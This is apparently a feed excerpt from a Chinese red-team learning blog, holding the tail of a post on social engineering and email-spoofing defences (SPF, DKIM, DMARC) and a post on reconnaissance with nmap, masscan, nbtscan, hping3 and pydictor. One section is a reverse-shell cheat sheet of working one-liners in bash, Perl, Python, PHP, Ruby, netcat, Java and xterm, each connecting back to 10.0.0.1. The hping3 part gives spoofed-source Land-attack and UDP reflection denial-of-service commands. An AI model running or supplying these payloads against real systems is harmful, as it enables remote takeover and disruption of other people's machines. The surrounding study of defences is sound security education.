title="UDF提权"></a>UDF提权</h3><ul><li><a href="https://www.cnblogs.com/zzjdbk/p/12989830.html">https://www.cnblogs.com/zzjdbk/p/12989830.html</a>   —MySQL提权之udf提权(获得webshell的情况)</li><li><a href="https://www.jianshu.com/p/5b34c1b6dee7">https://www.jianshu.com/p/5b34c1b6dee7</a>   –另外的思路</li></ul><hr><h2 id="3、社会工程学"><a href="#3、社会工程学" class="headerlink" title="3、社会工程学"></a>3、社会工程学</h2><h3 id="水坑攻击"><a href="#水坑攻击" class="headerlink" title="水坑攻击"></a>水坑攻击</h3><p>“水坑攻击”，黑客攻击方式之一，顾名思义，是在受害者必经之路设置了一个“水坑(陷阱)”。最常见的做法是，黑客分析攻击目标的上网活动规律，寻找攻击目标经常访问的网站的弱点，先将此网站“攻破”并植入攻击代码，一旦攻击目标访问该网站就会“中招”。</p><p>由于此种攻击借助了目标团体所信任的网站，攻击成功率很高，即便是那些对鱼叉攻击或其他形式的钓鱼攻击具有防护能力的团体</p><p>水坑攻击属于APT攻击的一种，与钓鱼攻击相比，黑客无需耗费精力制作钓鱼网站，而是利用合法网站的弱点，隐蔽性比较强。在人们安全意识不断加强的今天，黑客处心积虑地制作钓鱼网站却被有心人轻易识破，而水坑攻击则利用了被攻击者对网站的信任。</p><p>水坑攻击利用网站的弱点在其中植入攻击代码，攻击代码利用浏览器的缺陷，被攻击者访问网站时终端会被植入恶意程序或者直接被盗取个人重要信息。</p><p>水坑攻击相对于通过社会工程方式引诱目标用户访问恶意网站更具欺骗性，效率也更高。水坑方法主要被用于有针对性的攻击，而Adobe Reader、Java运行时环境（JRE）、Flash和IE中的零漏洞被用于安装恶意软件</p><ul><li><a href="https://baike.baidu.com/item/%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB/17644830">https://baike.baidu.com/item/%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB/17644830</a></li></ul><hr><h3 id="鱼叉攻击"><a href="#鱼叉攻击" class="headerlink" title="鱼叉攻击"></a>鱼叉攻击</h3><p>“鱼叉攻击”是黑客攻击方式之一，最常见的做法是，将木马程序作为电子邮件的附件，并起上一个极具诱惑力的名称，发送给目标电脑，诱使受害者打开附件，从而感染木马。</p><ul><li><a href="https://baike.baidu.com/item/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB">https://baike.baidu.com/item/鱼叉攻击</a></li></ul><h4 id="Swaks-邮件伪造"><a href="#Swaks-邮件伪造" class="headerlink" title="Swaks-邮件伪造"></a>Swaks-邮件伪造</h4><ul><li><a href="https://www.cnblogs.com/zhaijiahui/p/11494626.html">https://www.cnblogs.com/zhaijiahui/p/11494626.html</a></li></ul><p>瑞士军刀还是很有名的，熟悉下原理和简单的 –to –from –attach –data –elho这几种使用意思就OK了…</p><hr><h4 id="邮件伪造防御技术"><a href="#邮件伪造防御技术" class="headerlink" title="邮件伪造防御技术"></a>邮件伪造防御技术</h4><h5 id="SPF"><a href="#SPF" class="headerlink" title="SPF"></a>SPF</h5><p>SPF是 Sender Policy Framework 的缩写，一种以IP地址认证电子邮件发件人身份的技术，是为了防范垃圾邮件而提出来的一种DNS记录类型，它是一种TXT类型的记录。 接收邮件方会首先检查域名的SPF记录，来确定发件人的IP地址是否被包含在SPF记录里面，如果在，就认为是一封正确的邮件，否则会认为是一封伪造的邮件进行退回。</p><p>SPF可以防止别人伪造你来发邮件，是一个反伪造性邮件的解决方案。当你定义了你域名的SPF记录之后， 接收邮件方会根据你的SPF记录来确定连接过来的IP地址是否被包含在SPF记录里面，如果在，则认为是一封正确的邮件，否则则认为是一封伪造的邮件。</p><p>设置正确的 SPF 记录可以提高邮件系统发送外域邮件的成功率，也可以一定程度上防止别人假冒你的域名发邮件。</p><ul><li><a href="https://www.jianshu.com/p/b3460757d260">https://www.jianshu.com/p/b3460757d260</a>   –使用方法</li></ul><h5 id="DKIM"><a href="#DKIM" class="headerlink" title="DKIM"></a>DKIM</h5><p>DKIM是一种防范电子邮件欺诈的验证技术，通过消息加密认证的方式对邮件发送域名进行验证。</p><p>邮件发送方发送邮件时，利用本域私钥加密邮件生成DKIM签名，将DKIM签名及其相关信息插入邮件头。邮件接收方接收邮件时，通过DNS查询获得公钥，验证邮件DKIM签名的有效性。从而确认在邮件发送的过程中，防止邮件被恶意篡改，保证邮件内容的完整性</p><ul><li>DKIM RFC协议：<a href="http://tools.ietf.org/html/rfc6376">http://tools.ietf.org/html/rfc6376</a></li><li>DKIM官方网站：<a href="http://www.dkim.org/">http://www.dkim.org/</a></li></ul><h5 id="DMARC"><a href="#DMARC" class="headerlink" title="DMARC"></a>DMARC</h5><p>DMARC是一种基于现有的SPF和DKIM协议的可扩展电子邮件认证协议，在邮件收发双方建立了邮件反馈机制，便于邮件发送方和邮件接收方共同对域名的管理进行完善和监督。</p><p>DMARC要求域名所有者在DNS记录中设置SPF记录和DKIM记录，并明确声明对验证失败邮件的处理策略。邮件接收方接收邮件时，首先通过DNS获取DMARC记录，再对邮件来源进行SPF验证和DKIM验证，对验证失败的邮件根据DMARC记录进行处理，并将处理结果反馈给发送方。</p><p>DMARC能够有效识别并拦截欺诈邮件和钓鱼邮件，保障用户个人信息安全。</p><p>设置完 SPF 和 DKIM 后，您就能以 TXT 记录的形式向您网域的 DNS 记录添加政策，从而配置 DMARC（方法与配置 SPF 或 ADSP 一样）</p><ul><li><p><a href="https://support.google.com/a/answer/2466563?hl=zh-Hans">https://support.google.com/a/answer/2466563?hl=zh-Hans</a></p></li><li><p><a href="https://dmarc.org//draft-dmarc-base-00-01.html#iana_dmarc_tags">https://dmarc.org//draft-dmarc-base-00-01.html#iana_dmarc_tags</a></p></li><li><p>DMARC RFC协议：<a href="http://tools.ietf.org/html/rfc7489">http://tools.ietf.org/html/rfc7489</a></p></li><li><p>DMARC官方网站：<a href="https://dmarc.org/">https://dmarc.org/</a></p></li></ul><hr><h3 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a>钓鱼攻击</h3><p>钓鱼式攻击是一种企图从电子通讯中，通过伪装成信誉卓著的法人媒体以获得如用户名、密码和信用卡明细等个人敏感信息的犯罪诈骗过程。这些通信都声称(自己)来自社交网站拍卖网站网络银行、电子支付网站或网络管理者，以此来诱骗受害人的轻信。网钓通常是通过e-mail或者即时通讯进行。它常常导引用户到∪RL与界面外观与真正网站几无二致的假冒网站输入个人数据。就算使用强式加密的SSL服务器认证，要侦测网站是否仿冒实际上仍很困难。</p><ul><li><a href="https://zh.wikipedia.org/wiki/%E9%92%93%E9%B1%BC%E5%BC%8F%E6%94%BB%E5%87%BB">https://zh.wikipedia.org/wiki/钓鱼式攻击</a></li></ul><h4 id="视觉效果"><a href="#视觉效果" class="headerlink" title="视觉效果"></a>视觉效果</h4><p>某次应急响应中，从A客户（跨国经销商）那里了解到的情况如下：</p><pre><code class="hljs dns"><span class="hljs-keyword">A</span>是商家 B商家的消费者 C黑客</code></pre><p>C攻入了A的邮件服务器，并且持续控制了一个季度，共3个月。</p><p>B要购买A的产品时，A发送合同给B，同时C的木马也在读取邮件数据库的内容，合同中有付款账户，C从中截获A的邮件，并且修改合同内容，从邮件服务器拉取到了前一年的合同模板，将银行账户打印上去，B收到C的合同后迸行了打款，同时B在向A确认的过程中，A发现B受骗了。</p><p>思考:</p><pre><code class="hljs mathematica"><span class="hljs-built_in">C</span>怎么给<span class="hljs-variable">B</span>发送的邮件<span class="hljs-operator">,</span>取得了<span class="hljs-variable">B</span>的信任呢<span class="hljs-operator">?</span></code></pre><p>这里举个例子: <code>fish.com</code>与 <code>fish.corn</code></p><p>乍一看，<code>fish.com</code>中的<code>com</code>与<code>corn</code>非常相似，有个别字体影响的话，还是很难分辨的，更别说歪果仁了…</p><p><strong>宋体</strong></p><p><strong>娃娃体</strong></p><hr><h4 id="凭证劫持"><a href="#凭证劫持" class="headerlink" title="凭证劫持"></a>凭证劫持</h4><p><strong>漏洞危害</strong></p><p>劫持凭证，构造链接登录受害者账号</p><p><strong>文章：</strong></p><ul><li><a href="https://cn-sec.com/archives/69153.html">https://cn-sec.com/archives/69153.html</a></li><li><a href="https://sec.thief.one/article_content?a_id=a6dd0c77f46b5dd7030c79d3e24f804a">https://sec.thief.one/article_content?a_id=a6dd0c77f46b5dd7030c79d3e24f804a</a></li></ul><p>雷神众测原文被删了好像…</p><hr><h4 id="克隆技术"><a href="#克隆技术" class="headerlink" title="克隆技术"></a>克隆技术</h4><ul><li><p><a href="https://www.jianshu.com/p/6df51799cd9d">https://www.jianshu.com/p/6df51799cd9d</a>  —基础介绍钓鱼</p></li><li><p><a href="https://blog.csdn.net/qq_39379812/article/details/90679722">https://blog.csdn.net/qq_39379812/article/details/90679722</a>   –复现、实战</p></li><li><p><a href="https://blog.51cto.com/13587123/2151193">https://blog.51cto.com/13587123/2151193</a>   –老文章</p></li></ul><hr><h4 id="Word文档-云宏代码钓鱼"><a href="#Word文档-云宏代码钓鱼" class="headerlink" title="Word文档-云宏代码钓鱼"></a>Word文档-云宏代码钓鱼</h4><p><a href="https://cloud.tencent.com/developer/article/1518725">https://cloud.tencent.com/developer/article/1518725</a><br><a href="https://xz.aliyun.com/t/2496">https://xz.aliyun.com/t/2496</a></p><p>两篇复现~~</p><hr><h2 id="4、APP密码算法通用分析方法"><a href="#4、APP密码算法通用分析方法" class="headerlink" title="4、APP密码算法通用分析方法"></a>4、APP密码算法通用分析方法</h2><ul><li><a href="https://my.oschina.net/u/4587690/blog/4571625">https://my.oschina.net/u/4587690/blog/4571625</a>     –原文</li></ul><hr><h2 id="5、Linux下反弹she命令"><a href="#5、Linux下反弹she命令" class="headerlink" title="5、Linux下反弹she命令"></a>5、Linux下反弹she命令</h2><p>Hackthebox经典提权：</p><p><strong>Bash</strong><br>Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):</p><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></pre><p><strong>PERL</strong><br>Here’s a shorter, feature-free version of the perl-reverse-shell:</p><pre><code class="hljs PERL">perl -e <span class="hljs-string">&#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></code></pre><p>There’s also an alternative PERL revere shell here.</p><p><strong>Python</strong><br>This was tested under Linux / Python 2.7:</p><pre><code class="hljs Python">python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><span class="hljs-number">1</span></code></pre><p><strong>PHP</strong><br>This code assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4, 5, 6…</p><pre><code class="hljs php">php -r <span class="hljs-string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></code></pre><p>If you want a .php file to upload, see the more featureful and robust php-reverse-shell.</p><p><strong>Ruby</strong></p><pre><code class="hljs ruby">ruby -rsocket -e<span class="hljs-string">&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></code></pre><p><strong>Netcat</strong><br>Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.</p><pre><code class="hljs netcat">nc -e &#x2F;bin&#x2F;sh 10.0.0.1 1234</code></pre><p>If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:</p><pre><code class="hljs awk">rm <span class="hljs-regexp">/tmp/</span>f;mkfifo <span class="hljs-regexp">/tmp/</span>f;cat <span class="hljs-regexp">/tmp/</span>f|<span class="hljs-regexp">/bin/</span>sh -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>|nc <span class="hljs-number">10.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">1234</span> &gt;<span class="hljs-regexp">/tmp/</span>f</code></pre><p><strong>Java</strong></p><pre><code class="hljs java">r = Runtime.getRuntime()p = r.exec([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] as String[])p.waitFor()</code></pre><p>[Untested submission from anonymous reader]</p><p><strong>xterm</strong><br>One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.</p><pre><code class="hljs xterm">xterm -display 10.0.0.1:1</code></pre><p>To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):</p><pre><code class="hljs xterm">Xnest :1</code></pre><p>You’ll need to authorise the target to connect to you (command also run on your host):</p><pre><code class="hljs nginx"><span class="hljs-attribute">xhost</span> +targetip</code></pre><ul><li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a>   –参考文章</li></ul><hr><p>shell文章：</p><ul><li><p><a href="https://www.cnblogs.com/p0pl4r/p/10643541.html">https://www.cnblogs.com/p0pl4r/p/10643541.html</a> </p></li><li><p><a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html">https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html</a></p></li><li><p><a href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a>  –Linux反弹shell（一）文件描述符与重定向</p></li></ul><ul><li><a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a>   –Linux 反弹shell（二）反弹shell的本质</li></ul><p>打过靶机的应该都会…</p><hr><h2 id="6、Browser-Pivot-for-Chrome"><a href="#6、Browser-Pivot-for-Chrome" class="headerlink" title="6、Browser Pivot for Chrome"></a>6、Browser Pivot for Chrome</h2><ul><li><p><a href="https://ijustwannared.team/2019/03/11/browser-pivot-for-chrome/">https://ijustwannared.team/2019/03/11/browser-pivot-for-chrome/</a>     –全英文篇</p></li><li><p><a href="https://xz.aliyun.com/t/4417">https://xz.aliyun.com/t/4417</a>    –Browser Pivot for Chrome</p></li><li><p><a href="https://blog.csdn.net/weixin_44677409/article/details/102725129">https://blog.csdn.net/weixin_44677409/article/details/102725129</a>   –Cobalt Strike使用教程一</p></li><li><p><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0用户手册_中文翻译.pdf</a>   –CS非常详细教程  pdf版本，感谢QAX</p></li></ul><p>还可以参考书籍…</p><hr><p>到这里就结束打入内网的篇章了，将开启命令篇章!</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;二、打点-进入内网&quot;&gt;&lt;a href=&quot;#二、打点-进入内网&quot; class=&quot;headerlink&quot; title=&quot;二、打点-进入内网&quot;&gt;&lt;/a&gt;二、打点-进入内网&lt;/h1&gt;&lt;div class=&quot;note note-primary&quot;&gt;
            &lt;</summary>
      
    
    
    
    <category term="红队攻防" scheme="http://www.secice.cn/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/"/>
    
    
    <category term="红队攻防" scheme="http://www.secice.cn/tags/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/"/>
    
    <category term="渗透攻击红队百科全书" scheme="http://www.secice.cn/tags/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%BA%A2%E9%98%9F%E7%99%BE%E7%A7%91%E5%85%A8%E4%B9%A6/"/>
    
  </entry>
  
  <entry>
    <title>红队攻防学习之信息收集</title>
    <link href="http://www.secice.cn/p/a184e79"/>
    <id>http://www.secice.cn/p/a184e79</id>
    <published>2020-12-15T08:49:46.000Z</published>
    <updated>2020-12-15T09:00:06.979Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机发现"><a href="#1、主机发现" class="headerlink" title="1、主机发现"></a>1、主机发现</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>官网: <a href="https://nmap.org/">https://nmap.org/</a><br>安装系统及命令:</p><ul><li><p>Mac os: <code>brew install nmap</code></p></li><li><p>Centos: <code>yum install nmap</code></p></li><li><p>Ubuntu: <code>apt一get install nmap</code></p></li></ul><p>参考手册: <a href="https://nmap.org/man/zh/index.html">https://nmap.org/man/zh/index.html</a></p><h4 id="扫描方式"><a href="#扫描方式" class="headerlink" title="扫描方式"></a><strong>扫描方式</strong></h4><p>常见的七种扫描方式：</p><ul><li><p>ТСР: -sT</p></li><li><p>SYN: -sS</p></li><li><p>ACK: -sA</p></li><li><p>UDP: -sU</p></li><li><p>RPC: -sR</p></li><li><p>ICMP: -sP</p></li><li><p>Disable Port Scan: -sn</p></li></ul><p>最常见的这些参数解释：<a href="https://blog.csdn.net/liudongdong19/article/details/83506731">https://blog.csdn.net/liudongdong19/article/details/83506731</a></p><h4 id="常见扫描案例"><a href="#常见扫描案例" class="headerlink" title="常见扫描案例"></a><strong>常见扫描案例</strong></h4><ul><li>扫描10000端口、操作系统、版本</li></ul><pre><code class="hljs bash">nmap -T4 -A &lt;target&gt;</code></pre><ul><li>版本探测</li></ul><pre><code class="hljs bash">nmap -sV &lt;target&gt;</code></pre><ul><li>操作系统</li></ul><pre><code class="hljs bash">nmap -O &lt;target&gt;</code></pre><ul><li>其他常用技巧：</li></ul><pre><code class="hljs bash">--host-timeout 主机超时时间 通常选值：18000--scan-delay 报文时间间隔 通常选值：1000-s &lt;源地址&gt; 定义扫描源地址，为了不被发现</code></pre><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><pre><code class="hljs bash">nmap -V -iR 100000 -PO -p 80</code></pre><p>随机选择100000台主机扫描是否运行Web服务器（80端口）。由起始阶段发送探测报文来确定主机是否工作非常浪费时间，而且只需探测主机的一个端口，因此使用-PO禁止对主机列表。</p><pre><code class="hljs bash">host -l company.com | cut -d -f 4 | nmap -V -iL -</code></pre><p>进行DNS区域传输，以发现company.com中的主机，然后将IP地址提供给Nmap。上述命令用于GNU/Linux —— 其它系统进行区域传输时有不同的命令。</p><h4 id="输出"><a href="#输出" class="headerlink" title="输出"></a><strong>输出</strong></h4><pre><code class="hljs bash">-oN &lt;File&gt;-oX &lt;XML File&gt;-oG &lt;filespec&gt;</code></pre><p>Grep输出参考：<a href="http://www.unspecific.com/nmap-oG-output/">http://www.unspecific.com/nmap-oG-output/</a></p><h3 id="Masscan"><a href="#Masscan" class="headerlink" title="Masscan"></a>Masscan</h3><p>项目地址: <a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a><br>安装:</p><pre><code class="hljs bash">$ sudo apt-get install git gcc make libpcap一dev$ git <span class="hljs-built_in">clone</span> https://github.com/ rober tdavidgr aham/ masscan$ <span class="hljs-built_in">cd</span> masscan$ make</code></pre><blockquote><p>该工具兼容Nmap的参数高级选项</p></blockquote><h4 id="高级选项"><a href="#高级选项" class="headerlink" title="高级选项"></a><strong>高级选项</strong></h4><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/01.png" alt="msscan"><br>命令：<code>sudo masscan --ports 1-10000 192.168.1.101 --adapter-ip 192.168.1.1</code></p><ul><li>-adapter-ip 指定发包的IP地址</li><li>-adapter-port 指定发包的源端口</li><li>-adapter-mac 指定发包的源MAC地址</li><li>-router-mac 指定网关的MAC地址</li><li>-exclude IP地址范围黑名单，防止masscan扫描</li><li>-excludefile 指定IP地址范围黑名单文件</li><li>-includefile，-iL 读取一个范围列表进行扫描</li><li>-wait 指定发送完包之后的等待时间，默认为10秒</li></ul><p>命令：<code>masscan -p 1-65535 192.168.1.101 --rate=100</code><br>在网络环境慢的情况下，快速扫描出存在端口与nmap配合</p><hr><h3 id="Nbtscan"><a href="#Nbtscan" class="headerlink" title="Nbtscan"></a>Nbtscan</h3><p>kali系统自带nbtscan，以及查看帮助说明</p><pre><code class="hljs bash">ice@iceH:~/Desktop$ whereis nbtscannbtscan: /usr/bin/nbtscan /usr/share/man/man1/nbtscan.1.gzice@iceH:~/Desktop$ nbtscan NBTscan version 1.6.This is a free software and it comes with absolutely no warranty.You can use, distribute and modify it under terms of GNU GPL 2+.Usage:nbtscan [-v] [-d] [-e] [-l] [-t timeout] [-b bandwidth] [-r] [-q] [-s separator] [-m retransmits] (-f filename)|(&lt;scan_range&gt;) ......</code></pre><h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a><strong>示例</strong></h4><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/02.png" alt="nbtscan"><br>nbtscan扫描可以发现主机名、MAC addr等信息…</p><ul><li>扫描整个C段</li></ul><pre><code class="hljs bash">nbtscan -r 192.168.1.0/24</code></pre><ul><li>扫描一个范围</li></ul><pre><code class="hljs bash">nbtscan 192.168.1.1-100</code></pre><ul><li>以:分割显示结果</li></ul><pre><code class="hljs bash">nbtscan -v -s : 192.168.1.0/24</code></pre><ul><li>从文件读取扫描范围</li></ul><pre><code class="hljs bash">nbtscan -f &lt;File&gt;</code></pre><h4 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a><strong>高级用法</strong></h4><pre><code class="hljs bash">sudo nbtscan -v -s <span class="hljs-string">&#x27; &#x27;</span> 192.168.1.105sudo nbtscan -v -s <span class="hljs-string">&#x27; &#x27;</span> 192.168.1.105 | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | uniq</code></pre><pre><code class="hljs bash">ice@iceH:~/Desktop$ sudo nbtscan -v -s <span class="hljs-string">&#x27; &#x27;</span> 192.168.1.105192.168.1.105 GOOGLE-28D12ECA 00U192.168.1.105 GOOGLE-28D12ECA 20U192.168.1.105 WORKGROUP       00G192.168.1.105 WORKGROUP       1eG192.168.1.105 WORKGROUP       1dU192.168.1.105 __MSBROWSE__ 01G192.168.1.105 MAC 00:0c:29:f5:84:34ice@iceH:~/Desktop$ sudo nbtscan -v -s <span class="hljs-string">&#x27; &#x27;</span> 192.168.1.105 | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | uniq192.168.1.105</code></pre><hr><h3 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h3><p>hping3主要测试防火墙的拦截规则，对网络设备进行测试</p><h4 id="常用模式"><a href="#常用模式" class="headerlink" title="常用模式"></a><strong>常用模式</strong></h4><ul><li>-0 -rawip IP原始报文</li><li>-1 -icmp ICMP模式</li><li>-2 -udp UDP模式</li><li>-8 -scan 扫描模式</li><li>-9 -listen 监听模式</li></ul><blockquote><p>SYN方式扫描主机端口</p></blockquote><pre><code class="hljs bash">hping3 --scan 445,135 -S 192.168.1.105</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/03.png" alt="hping3"></p><p>可以看到，目标主机回复了: S…A，代表SYN/ACK</p><blockquote><p>测试防火墙对ICMP包的反应、是否支持traceroute、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）</p></blockquote><pre><code class="hljs bash">hping3 -S -a 114.114.114.114 -p 53 114.114.114.114 -c 5</code></pre><h4 id="DRDDOS"><a href="#DRDDOS" class="headerlink" title="DRDDOS"></a><strong>DRDDOS</strong></h4><blockquote><p>基于UDP的DOS</p></blockquote><pre><code class="hljs bash">hping3 -udp -a 114.114.114.114 -p 53 114.114.114.114 -c 5</code></pre><p><strong>参考</strong></p><p><a href="http://0daysecurity.com/articles/hping3_examples.html">http://0daysecurity.com/articles/hping3_examples.html</a>    –很详细用法的解释<br><a href="http://man.linuxde.net/hping3">http://man.linuxde.net/hping3</a></p><hr><h2 id="2、关联信息生成"><a href="#2、关联信息生成" class="headerlink" title="2、关联信息生成"></a>2、关联信息生成</h2><p>在渗透前期工作开展之前，需要对目标的各种信息进行分析、拆分、组合<br>例如:赫尔巴斯亚基国<br>根据地域习惯、宗教、互联网开放信息等信息进行简要拆分，假设获取的信息如下:</p><ul><li>当地人爱好吃橙子</li><li>当地人信奉伊斯兰教</li><li>IPV4地址开放IP段</li><li>相关社交网络公 开的数据库</li></ul><p>根据宗教、习惯、IP地址、 开放数据支持…等，为后续的字典生成、鱼叉、水坑攻击铺下基石</p><h3 id="字典生成：pydictor"><a href="#字典生成：pydictor" class="headerlink" title="字典生成：pydictor"></a>字典生成：pydictor</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装:"></a><strong>安装:</strong></h4><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/LandGrey/pydictor</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/04.png" alt="安装"></p><h4 id="生成字典"><a href="#生成字典" class="headerlink" title="生成字典"></a>生成字典</h4><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/05.png" alt="生成字典"></p><p>命令：<code>python pydictor.py --sedb</code></p><pre><code class="hljs bash">python pydictor.py --sedb<span class="hljs-built_in">set</span> cname liwei<span class="hljs-built_in">set</span> sname lw Lwei<span class="hljs-built_in">set</span> ename zwell<span class="hljs-built_in">set</span> birth 19880916<span class="hljs-built_in">set</span> usedpwd liwei123456. liwei@19880916 lw19880916_123<span class="hljs-built_in">set</span> phone 18852006666<span class="hljs-built_in">set</span> uphone 15500998080<span class="hljs-built_in">set</span> hphone 76500100 61599000 01061599000<span class="hljs-built_in">set</span> email 33125500@qq.com<span class="hljs-built_in">set</span> email 13561207878@163.com<span class="hljs-built_in">set</span> email weiweili@gmail.com<span class="hljs-built_in">set</span> email wei010wei@hotmail.com<span class="hljs-built_in">set</span> postcode 663321 962210<span class="hljs-built_in">set</span> nickname zlili<span class="hljs-built_in">set</span> idcard 152726198809160571<span class="hljs-built_in">set</span> jobnum 20051230 100563<span class="hljs-built_in">set</span> otherdate 19591004 19621012<span class="hljs-built_in">set</span> otherdate 19870906 19880208<span class="hljs-built_in">set</span> usedchar tiger gof gamesthrones 176003 m0n5ter ppdogrun</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/06.png" alt="生成字典"></p><h4 id="合并去重"><a href="#合并去重" class="headerlink" title="合并去重"></a><strong>合并去重</strong></h4><pre><code class="hljs bash">python pydictor.py -tool uniqbiner /my/all/dict/</code></pre><h4 id="多字典文件组合工具"><a href="#多字典文件组合工具" class="headerlink" title="多字典文件组合工具"></a><strong>多字典文件组合工具</strong></h4><pre><code class="hljs bash">python pydictor.py -tool hybrider heads.txt some_others.txt tails.txt</code></pre><p>参考详细：<a href="https://github.com/LandGrey/pydictor/blob/master/docs/doc/usage.md">https://github.com/LandGrey/pydictor/blob/master/docs/doc/usage.md</a></p><hr><h2 id="3、开放漏洞情报"><a href="#3、开放漏洞情报" class="headerlink" title="3、开放漏洞情报"></a>3、开放漏洞情报</h2><h3 id="常用网站"><a href="#常用网站" class="headerlink" title="常用网站"></a>常用网站</h3><ul><li>CVE：<a href="https://cve.mitre.org/">https://cve.mitre.org/</a></li><li>Exploit-DB：<a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></li><li>CX Security：<a 